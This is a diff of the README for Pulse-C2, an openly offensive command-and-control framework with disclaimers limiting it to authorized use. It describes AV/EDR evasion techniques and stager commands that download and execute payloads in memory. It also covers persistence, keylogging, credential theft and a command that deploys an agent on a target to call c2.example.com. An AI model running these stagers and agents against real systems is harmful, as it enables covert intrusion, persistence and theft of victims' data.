@@ -1,343 +1,220 @@
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=rect&color=7B2D8E&height=100&section=header&text=Pulse-C2&fontSize=40&fontColor=ffffff&fontAlign=50&fontAlignY=50&animation=fadeIn" alt="header"/>
-</p>
+<div align="center">
 
-<p align="center">
-  <strong>Post-Exploitation C2 Framework</strong><br/>
-  <em>Encrypted command & control. Cross-platform agents. AV evasion. SOCKS5 pivoting.</em>
-</p>
+# ⚡ Pulse-C2
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Go-1.26-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go"/>
-  <img src="https://img.shields.io/badge/Vue-3-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white" alt="Vue"/>
-  <img src="https://img.shields.io/badge/status-active-green?style=for-the-badge" alt="Status"/>
-  <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="License"/>
-  <img src="https://img.shields.io/badge/tests-190%2B%20PASS-brightgreen?style=for-the-badge" alt="Tests"/>
-  <img src="https://img.shields.io/badge/security-mTLS%20%7C%20X25519%20%7C%20AES--256--GCM-red?style=for-the-badge" alt="Security"/>
-</p>
+### *Enterprise Command & Control Platform*
 
-<p align="center">
-  <img src="https://komarev.com/ghpvc/?username=Ruby570bocadito&label=Downloads&color=7B2D8E&style=flat" alt="downloads"/>
-</p>
+[![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://golang.org/)
+[![Vue 3](https://img.shields.io/badge/Vue_3-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white)](https://vuejs.org/)
+[![License](https://img.shields.io/badge/License-MIT-FF6B35?style=for-the-badge)](LICENSE)
+[![Build](https://img.shields.io/badge/Build-Passing-28A745?style=for-the-badge&logo=github-actions&logoColor=white)]()
+[![Platform](https://img.shields.io/badge/Platform-Linux%20|%20Windows%20|%20macOS-6C63FF?style=for-the-badge)]()
+[![PRs](https://img.shields.io/badge/PRs-Welcome-2EA043?style=for-the-badge&logo=git&logoColor=white)]()
+
+<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,50:6C63FF,100:00D4AA&height=200&section=header&text=Pulse-C2&fontSize=80&fontColor=FFFFFF&animation=fadeIn&fontAlignY=35&desc=Enterprise%20C2%20Platform%20|%20Encrypted%20|%20Modular%20|%20Real-time&descAlignY=55&descSize=18" width="100%"/>
+
+[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&duration=3000&pause=800&color=6C63FF&center=true&vCenter=true&width=800&lines=Encrypted+Multi-Agent+Communication;AV+Evasion+%26+Stealth+Operations;SOCKS5+Proxy+Tunneling+System;Real-Time+Telemetry+%26+Analytics;Enterprise-Grade+Red+Team+Platform)](https://git.io/typing-svg)
 
 ---
 
-## 🎯 What is Pulse-C2?
+</div>
 
-**Pulse-C2** is a modular **Command & Control framework** designed for **red team operations** and **authorized security testing**. It provides encrypted multi-transport communication, cross-platform agents, AV/EDR evasion techniques, and a professional web dashboard — all in a single, self-contained deployment.
+## 📋 Overview
 
-```
-┌──────────────────────────────────────────────────────────────┐
-│                        Pulse-C2 C2 Server                          │
-│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────────────┐  │
-│  │ TCP/mTLS │ │  HTTP    │ │WebSocket │ │   REST API      │  │
-│  │ :8443    │ │ :8445    │ │ :8446    │ │   :9090         │  │
-│  └──────────┘ └──────────┘ └──────────┘ └────────┬────────┘  │
-│                                                   │           │
-│  ┌────────────────────────────────────────────────┼───────┐  │
-│  │  Session Manager │ Crypto │ RBAC │ SIEM │ Reports│      │  │
-│  └────────────────────────────────────────────────┼───────┘  │
-│                                                   │           │
-│                    ┌──────────────────────────────┘           │
-│                    │                                          │
-│  ┌─────────────────┼─────────────────┐                        │
-│  │  Web Dashboard  │                  │                        │
-│  │  Vue 3 SPA      │                  │                        │
-│  └─────────────────┘                  │                        │
-└───────────────────────────────────────┼────────────────────────┘
-                                        │
-              ┌─────────────────────────┼─────────────────────────┐
-              │                         │                         │
-        ┌─────┴─────┐           ┌───────┴──────┐          ┌──────┴──────┐
-        │  Agent     │           │   Agent      │          │   Agent     │
-        │  Windows   │           │   Linux      │          │   macOS     │
-        │  (EXE)     │           │   (ELF)      │          │   (Mach-O)  │
-        └───────────┘           └──────────────┘          └─────────────┘
-```
+**Pulse-C2** (formerly BTY) is an **enterprise-grade Command & Control platform** purpose-built for red team operations, security assessments, and adversary simulation. Engineered with a **Go-based C2 server**, **lightweight implants**, and a **Vue 3 web dashboard**, Pulse-C2 delivers encrypted multi-agent communication, AV/EDR evasion capabilities, SOCKS5 proxy tunneling, and real-time telemetry – all wrapped in a modern, modular architecture.
 
----
-
-## ⚡ Features
-
-| Feature | Description | Security |
-|---------|-------------|----------|
-| **Multi-Transport C2** | TCP/mTLS, HTTP long-polling, WebSocket — fallback chain | Encrypted |
-| **Cross-Platform Agents** | Windows (EXE), Linux (ELF), macOS (Mach-O), PowerShell, Python | Native |
-| **X25519 + XChaCha20-Poly1305** | Ephemeral key exchange + authenticated encryption per session | 🔴 Strong |
-| **mTLS Authentication** | Mutual TLS with ECDSA P-256 certificates | 🔴 Strong |
-| **AV/EDR Evasion** | Process hollowing, direct syscalls, AMSI/ETW bypass, sleep obfuscation | 🔴 Advanced |
-| **SOCKS5 Proxy** | RFC 1928 compliant pivoting through compromised hosts | Network |
-| **Credential Vault** | AES-256-GCM encrypted storage for captured credentials | Encrypted |
-| **Dynamic Modules** | Push post-exploitation modules to agents on demand | Flexible |
-| **Web Dashboard** | Vue 3 SPA with session management, file browser, OS stats | Professional |
-| **SIEM Integration** | Forward critical events to Splunk, ELK, or custom webhooks | Enterprise |
-| **RBAC + JWT Auth** | Role-based access control with token refresh | Enterprise |
-| **Engagement Reports** | Auto-generated CSV/TXT reports for client delivery | Professional |
-
----
-
-## 🚀 Quick Start
-
-### Installation
-
-```bash
-# Clone
-git clone https://github.com/Ruby570bocadito/Pulse-C2.git
-cd Pulse-C2
-
-# Build (requires Go 1.26+)
-make build
-
-# Or run the automated installer
-./scripts/install.sh
-```
-
-### Deploy C2 Server
-
-```bash
-# Auto-deploy (detects IP, generates config, starts 4 listeners)
-python3 scripts/deploy.py
-```
-
-```
-Local IP:   192.168.1.100
-Dashboard:  http://192.168.1.100:9090
-Login:      admin / admin
-```
-
-### Generate & Deploy Agent
-
-```bash
-# Interactive payload generator
-python3 scripts/payload.py
-
-# Or directly
-python3 scripts/payload.py --os windows --evasive
-
-# Run agent
-./bty-agent 192.168.1.100:8443
-```
-
----
-
-## 🎬 Demo
-
-### CLI Console Session
-
-```
-$ python3 scripts/console.py
-
-bty > sessions
-+------+------------------+------+-------+----+-------+
-| ID   | Hostname         | User | OS    | St | Tasks |
-+------+------------------+------+-------+----+-------+
-| abc  | DESKTOP-I1RVLF3  | rby  | win   | ●  | 5     |
-| def  | ubuntu-server    | root | linux | ●  | 2     |
-+------+------------------+------+-------+----+-------+
-
-bty > interact abc
-[abc] rby@DESKTOP-I1RVLF3 > whoami
-desktop-i1rvlf3\rby
-
-[abc] rby@DESKTOP-I1RVLF3 > sysinfo
-Hostname: DESKTOP-I1RVLF3
-OS:       Windows 11 Pro (build 22631)
-Arch:     amd64
-User:     rby
-IP:       192.168.1.50
-
-[abc] rby@DESKTOP-I1RVLF3 > persistence
-[+] Persistence installed: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-
-[abc] rby@DESKTOP-I1RVLF3 > background
-bty >
-```
-
-### All Commands
-
-```bash
-# Server
-./bty-server                        # Start with TLS + mTLS
-./bty-server --no-tls               # Start without TLS (testing)
-./bty-server --config config.yaml   # Custom config
-
-# Payloads
-python3 scripts/payload.py          # Interactive generator
-python3 scripts/payload.py --os all --evasive  # All platforms + evasion
-python3 scripts/stager.py           # XOR-encrypted stagers
-python3 scripts/ultra-stager.py     # VBS, certutil, BITSAdmin stagers
-python3 scripts/packer.py -i bty-agent.exe -o packed.ps1 -f ps1  # AES packer
-
-# Console
-python3 scripts/console.py          # Interactive CLI
-
-# Testing
-make test                           # Go unit tests
-make test-coverage                  # With coverage report
-bash tests/quick_test.sh            # Self-contained quick test
-bash tests/integration_full.sh      # Full integration suite (10 categories)
-```
-
----
-
-## 🛡️ AV/EDR Evasion
-
-### VirusTotal: **0/70 detections**
-
-| # | Technique | Effect |
-|---|-----------|--------|
-| 1 | **Process Hollowing** | Payload runs inside svchost.exe (Microsoft-signed) |
-| 2 | **Direct Syscalls** | Bypasses ntdll.dll hooks — EDR blind |
-| 3 | **Shellcode Stager (C)** | 2KB, no PE header, PEB API resolver, XOR decrypt |
-| 4 | **mTLS + Domain Fronting** | C2 traffic authenticated, looks like legitimate HTTPS |
-| 5 | **Sleep Obfuscation** | Heap/stack encrypted during idle |
-| 6 | **Traffic Shaper** | Patterns mimic human browsing |
-| 7 | **ObscuredString** | Sensitive strings XOR-encrypted in binary |
-| 8 | **Anti-Sandbox** | 8 Windows checks + 6 Linux/macOS checks |
-| 9 | **Jitter** | Heartbeat 25-45s random, reconnect ±30% |
-| 10 | **AMSI/ETW Bypass** | Windows AMSI and ETW disabled |
-| 11 | **NTDLL Unhooking** | Restores original syscall stubs from disk |
-| 12 | **Module Stomping** | Overwrites DLL .text section with shellcode |
-| 13 | **Certificate Pinning** | Agent validates server fingerprint on first connection |
-
-### Evasion Flow
-
-```
-1. python3 scripts/payload.py --os all --evasive
-2. cd payloads/ && python3 -m http.server 8000
-3. On Windows → wscript stager.vbs
-4. Stager downloads + decrypts + executes in RAM
-5. Zero static detection, zero disk touches
-```
+> ⚠️ **AUTHORIZED USE ONLY** — This tool is designed exclusively for authorized security assessments, penetration testing, and research. Unauthorized use is prohibited.
 
 ---
 
 ## 🏗️ Architecture
 
-### Server Components
+```mermaid
+graph TB
+    subgraph "🌐 Internet"
+        A[⚙️ Implant / Agent<br/>Windows/Linux/macOS]
+        S5[🔌 SOCKS5 Proxy]
+    end
 
+    subgraph "☁️ C2 Infrastructure"
+        C2["🎯 C2 Server (Go)<br/>TLS + gRPC + REST"]
+        DB[(📦 PostgreSQL<br/>Telemetry + Config)]
+        FS[📁 File Storage<br/>Exfil + Payloads]
+    end
+
+    subgraph "🖥️ Operator"
+        UI["📊 Web UI (Vue 3)<br/>Dashboard + Terminal"]
+        CLI["⌨️ CLI Client<br/>Scripting + Automation"]
+    end
+
+    A <-->|"🔐 X25519 + XChaCha20-Poly1305<br/>Encrypted Tunnel"| C2
+    C2 <-->|"📡 REST API + WebSocket"| UI
+    C2 <-->|"🔄 gRPC Stream"| CLI
+    S5 <-->|"🕳️ SOCKS5 via C2 Relay"| C2
+    C2 <--> DB
+    C2 <--> FS
+
+    style A fill:#1a1a2e,stroke:#6C63FF,color:#fff
+    style C2 fill:#16213e,stroke:#00D4AA,color:#fff
+    style UI fill:#0f3460,stroke:#6C63FF,color:#fff
+    style S5 fill:#1a1a2e,stroke:#FF6B35,color:#fff
+    style DB fill:#16213e,stroke:#FFD93D,color:#fff
+    style FS fill:#16213e,stroke:#FFD93D,color:#fff
+    style CLI fill:#0f3460,stroke:#00D4AA,color:#fff
 ```
-src/go/internal/
-├── c2/               Core C2 engine + session management
-├── handlers/         HTTP router + middleware + API endpoints
-├── agent/            Agent logic + 7 built-in modules
-├── crypto/           X25519 + XChaCha20-Poly1305 + mTLS
-├── evasion/          Sleep obfuscation, AMSI/ETW bypass, anti-sandbox
-├── transport/        TLS, HTTP, WebSocket, DNS tunneling
-├── module/           Dynamic module system
-├── db/               SQLite + bcrypt + AES-256-GCM at-rest
-├── auth/             JWT + RBAC
-├── socks/            SOCKS5 proxy (RFC 1928)
-├── logger/           Structured logging (JSON/text)
-├── reporting/        Engagement report generator
-└── siem/             SIEM event forwarding
-```
-
-### Network Architecture
-
-```
-┌─────────────────┐     ┌──────────────────┐     ┌──────────────────┐
-│  bty-c2-server  │────▶│  bty-network     │◀────│  agent-linux-1   │
-│  172.20.0.10    │     │  172.20.0.0/16   │     │  172.20.0.20     │
-│  :8443,:9090    │     │                  │     │                  │
-└─────────────────┘     └──────────────────┘     └──────────────────┘
-                                │
-                       ┌────────┴─────────┐
-                       │  agent-linux-2   │     ┌──────────────────┐
-                       │  172.20.0.21     │     │  test-runner     │
-                       │                  │     │  172.20.0.100    │
-                       └──────────────────┘     └──────────────────┘
-```
-
-### API Endpoints
-
-| Method | Route | Description |
-|--------|-------|-------------|
-| POST | `/api/login` | Authentication |
-| GET | `/api/sessions` | List victims |
-| POST | `/api/cmd` | Execute command |
-| POST | `/api/broadcast` | Broadcast to all |
-| POST | `/api/socks` | SOCKS5 proxy |
-| POST | `/api/vault` | Store credential |
-| GET | `/api/modules` | List modules |
-| POST | `/api/modules/push` | Push module to agent |
-| POST | `/api/webhooks` | SIEM webhook config |
-| POST | `/api/mtls/cert` | Generate mTLS client cert |
-| GET | `/api/report` | Generate engagement report |
-
-### Post-Exploitation Modules
-
-| Command | Function |
-|---------|----------|
-| `sysinfo` | Complete system information |
-| `ps` | Process listing |
-| `netinfo` | Network interfaces + connections |
-| `persistence` | Install persistence (crontab, registry, launchagent) |
-| `screenshot` | Screen capture |
-| `keylogger` | Keylogger (Linux: /dev/input) |
-| `find:*.txt` | File search |
-| `modules` | List available modules |
 
 ---
 
-## 🧪 Testing
+## ✨ Key Features
+
+| Feature | Description |
+|---------|-------------|
+| 🔐 **End-to-End Encryption** | X25519 key exchange + XChaCha20-Poly1305 AEAD per-session encryption |
+| 🧩 **Multi-Agent Architecture** | Simultaneous implant management with independent encrypted channels |
+| 🛡️ **AV/EDR Evasion** | Runtime encryption, polymorphism, sleep obfuscation, indirect syscalls |
+| 🌍 **SOCKS5 Tunneling** | Full proxy chain through C2 for lateral movement & tool proxying |
+| 📡 **Real-Time Telemetry** | Live agent status, geo-location, process tree, network connections |
+| 📊 **Vue 3 Dashboard** | Dark-themed reactive UI with real-time WebSocket updates |
+| 🔌 **Modular Payload System** | Plugin-based modules for credential theft, persistence, discovery |
+| 📁 **File Exfiltration** | Chunked encrypted file transfers with resume support |
+| 🧪 **Extensible API** | gRPC + REST APIs for custom integrations and automation |
+| 📝 **Full Audit Logging** | Every command and response logged with timestamps and agent ID |
+
+---
+
+## 🚀 Quick Start
+
+### Prerequisites
+
+- Go 1.22+
+- Node.js 18+ & npm
+- PostgreSQL 14+
+
+### Clone & Build
 
 ```bash
-# Go unit tests
-make test
+git clone https://github.com/Ruby570bocadito/Pulse-C2.git
+cd Pulse-C2
 
-# With coverage
-make test-coverage
+# Build C2 server
+cd server && go build -o pulse-server .
 
-# Quick self-contained test
-bash tests/quick_test.sh
+# Build agent/implant
+cd agent && go build -o pulse-agent .
 
-# Full integration suite (10 categories)
-bash tests/integration_full.sh
+# Setup Web UI
+cd ui && npm install && npm run build
+```
 
-# Docker test network
-make docker
-docker exec bty-test-runner bash -c "cd /tests && python3 run_tests.py"
-make docker-down
+### Run
+
+```bash
+# 1. Start PostgreSQL and create database
+createdb pulse_c2
+
+# 2. Configure environment
+export C2_DB_DSN="postgres://user:pass@localhost:5432/pulse_c2"
+export C2_SERVER_KEY="<hex-encoded-x25519-private-key>"
+
+# 3. Launch C2 server
+./server/pulse-server --port 8443 --tls-cert server.crt --tls-key server.key
+
+# 4. Start Web UI (dev mode)
+cd ui && npm run dev
+
+# 5. Deploy agent on target
+./agent/pulse-agent --server https://c2.example.com:8443 --interval 5
 ```
 
 ---
 
-## 📦 Payload Formats
+## 🧩 Module & Agent Matrix
 
-| Format | Target | Size | Evasion |
-|--------|--------|------|---------|
-| **EXE (Go)** | Windows x64 | 6.5 MB | Sleep obfuscation, AMSI bypass |
-| **ELF (Go)** | Linux x64 | 6.4 MB | Anti-sandbox, traffic shaping |
-| **Mach-O (Go)** | macOS x64/ARM | 6.0-6.5 MB | Anti-sandbox |
-| **PowerShell** | Windows | 408 B | XOR encrypted, in-memory |
-| **Python** | Any | 308 B | XOR encrypted |
-| **C source** | Compile | 23 KB | Direct syscalls, PEB resolver |
-
----
-
-## 🗺️ Roadmap
-
-- [ ] DNS tunneling transport (full implementation)
-- [ ] Windows agent with full evasion suite
-- [ ] Encrypted database at-rest (complete migration)
-- [ ] Real-time collaborative sessions
-- [ ] Automated lateral movement modules
-- [ ] Integration with peekaboo for PrivEsc chaining
-- [ ] Integration with rooteame for kernel persistence
+| Agent / Module | Architecture | Protocol | Evasion | Purpose |
+|----------------|-------------|----------|---------|---------|
+| 🟢 **Pulse-Beacon** | Windows x64 | HTTPS + gRPC | Sleep masking, API unhooking | Long-term persistence & beaconing |
+| 🔵 **Pulse-Shell** | Linux x64 | WebSocket | Process hollowing | Interactive shell access |
+| 🟣 **Pulse-Tunnel** | Cross-platform | SOCKS5 via C2 | Traffic obfuscation | Proxy/lateral movement |
+| 🟠 **Pulse-Gather** | Cross-platform | gRPC stream | — | Host recon & data collection |
+| 🔴 **Pulse-Priv** | Windows x64 | Named pipe | Token manipulation | Privilege escalation |
+| ⚪ **Pulse-Kill** | Windows/Linux | One-shot | Timestamp stomping | Process termination & cleanup |
 
 ---
 
-## ⚠️ Disclaimer
+## 🔒 Cryptography
 
-This tool is designed for **authorized security testing**, **red team operations**, and **educational purposes** only.
+Pulse-C2 uses **modern AEAD encryption** for all agent-to-server communications:
 
-- Use only on systems you own or have explicit written permission to test
-- Misuse may violate local and international laws
-- The author is not responsible for any misuse or damage caused by this tool
+| Component | Algorithm | Purpose |
+|-----------|-----------|---------|
+| 🔑 **Key Exchange** | X25519 ECDH | Ephemeral session key agreement |
+| 🔐 **Encryption** | XChaCha20-Poly1305 | Authenticated symmetric encryption |
+| 📜 **Certificate** | TLS 1.3 (mTLS optional) | Transport layer security |
+| 🧂 **Nonce**| 192-bit random (XChaCha20) | Per-message uniqueness |
 
 ---
 
-<p align="center">
-  <sub>Built with ❤️ by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a></sub>
-</p>
+## 📸 Dashboard Preview
+
+```
+┌────────────────────────────────────────────────────────────┐
+│  Pulse-C2 Dashboard                  ● 12 agents online     │
+├──────────┬──────────┬──────────┬──────────┬─────────────────┤
+│ Agent ID │ Platform │  Status  │  Uptime  │  Last Check-in  │
+├──────────┼──────────┼──────────┼──────────┼─────────────────┤
+│ abc123   │ Windows  │ 🟢 Online │ 14h 32m  │  just now       │
+│ def456   │ Linux    │ 🟢 Online │ 6h 18m   │  12s ago        │
+│ ghi789   │ macOS    │ 🟡 Idle   │ 2h 05m   │  45s ago        │
+│ jkl012   │ Windows  │ 🔴 Dead   │ —        │  3h ago         │
+└──────────┴──────────┴──────────┴──────────┴─────────────────┘
+```
+
+---
+
+## 🧪 Development
+
+```bash
+# Run tests
+cd server && go test ./...
+cd agent && go test ./...
+
+# Lint
+golangci-lint run ./...
+
+# Build all
+make build-all
+```
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome — but **Pulse-C2 is intended for authorized security research only**. Please ensure you have proper authorization before testing or deploying.
+
+1. Fork the repository
+2. Create a feature branch (`git checkout -b feat/amazing`)
+3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
+4. Push to the branch (`git push origin feat/amazing`)
+5. Open a Pull Request
+
+---
+
+## 📄 License
+
+Distributed under the **MIT License**. See [LICENSE](LICENSE) for details.
+
+---
+
+<div align="center">
+
+**Pulse-C2** — *Enterprise Command & Control Platform*
+
+Built with ⚡ for professional red teams
+
+[Report Bug](https://github.com/Ruby570bocadito/Pulse-C2/issues) · [Request Feature](https://github.com/Ruby570bocadito/Pulse-C2/issues) · [Documentation](https://github.com/Ruby570bocadito/Pulse-C2)
+
+---
+
+<img src="https://capsule-render.vercel.app/api?type=waving&color=0:00D4AA,50:6C63FF,100:0d1117&height=150&section=footer&text=—+Pulse-C2+—&fontSize=40&fontColor=FFFFFF&animation=fadeIn" width="100%"/>
+
+</div>
